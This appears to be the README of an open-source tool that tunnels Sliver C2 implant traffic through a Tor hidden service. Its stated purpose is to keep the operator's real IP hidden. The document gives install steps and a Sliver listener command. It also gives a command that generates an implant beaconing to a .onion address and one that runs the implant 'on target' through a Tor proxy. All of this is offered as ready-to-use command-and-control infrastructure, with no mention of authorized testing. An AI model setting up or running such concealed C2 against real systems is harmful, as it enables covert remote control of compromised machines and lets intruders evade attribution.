![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Docker](https://img.shields.io/badge/docker-supported-blue)
![Sliver](https://img.shields.io/badge/Sliver-compatible-orange)

# sliver-tor-bridge

tor-based transport bridge for sliver c2. creates a hidden service and proxies traffic to your sliver server so your real ip is never exposed.

## what it does

sets up a tor hidden service that points to a local http proxy. the proxy forwards everything to sliver's https listener. implants connect through tor, you control them through sliver normally.

```
sliver server <---> proxy <---> tor hidden service <---> implant
   :8443           :8080          xyz.onion              (via tor)
```

## why use this

- your c2 server ip stays hidden behind tor
- implants only know the .onion address, not your real ip
- works with stock sliver, no modifications needed
- simple python setup, no go compilation required

## requirements

- python 3.8+
- tor (apt install tor)
- sliver (https://sliver.sh)

## install

```
git clone https://github.com/Otsmane-Ahmed/sliver-tor-bridge.git
cd sliver-tor-bridge
python3 -m venv venv
source venv/bin/activate
pip install -e .
```

## usage

start sliver with an https listener:

```
sliver-client
sliver > https -L 127.0.0.1 -l 8443
```

in another terminal, start the bridge:

```
sudo systemctl stop tor
sliver-tor-bridge start --sliver-port 8443
```

output will show something like:

```
[+] Tor started successfully!
[+] Hidden Service: http://abc123xyz.onion
[+] Bridge is READY!
```

wait for the .onion address, then generate an implant:

```
sliver > generate --http http://abc123xyz.onion --os linux --save /tmp/implant
```

run the implant on target (needs tor):

```
HTTP_PROXY=socks5h://127.0.0.1:9050 ./implant
```

## cli options

```
sliver-tor-bridge start [OPTIONS]

--sliver-port    sliver https port (default 8443)
--tor-port       tor socks port (default 9050)
--service-port   hidden service port (default 80)
-c, --config     config file path
```

other commands:

```
sliver-tor-bridge status    # check if hidden service is running
sliver-tor-bridge stop      # clean up hidden service directory
```

## how it works

```mermaid
graph LR
    Implant[Implant] -->|Tor Network| HS["Hidden Service (.onion)"]
    HS -->|TCP :8080| Proxy["Bridge Proxy"]
    Proxy -->|HTTPS :8443| Sliver["Sliver Server"]
```
1. tor manager starts a tor process and creates a hidden service
2. hidden service points to localhost:8080 (the proxy)
3. flask proxy listens on 8080 and forwards requests to sliver at localhost:8443
4. sliver handles implant communication normally

the bridge sits in the middle and relays traffic. sliver thinks its getting normal https connections. the implant thinks its talking to a normal http server.

## docker

```
docker-compose up -d
docker-compose logs -f
```

## testing

```
pip install pytest
pytest tests/
```

## files

```
sliver_tor_bridge/
  cli.py          # command line interface
  tor_manager.py  # starts tor and creates hidden service
  proxy.py        # flask app that forwards to sliver
  config.py       # configuration handling
```

## troubleshooting

**tor wont start**: make sure system tor is stopped (`sudo systemctl stop tor`)

**connection timeout**: tor bootstrap can take 1-3 minutes, wait for 100%

**implant not connecting**: make sure implant has tor access (socks proxy on 9050)

## license

mit
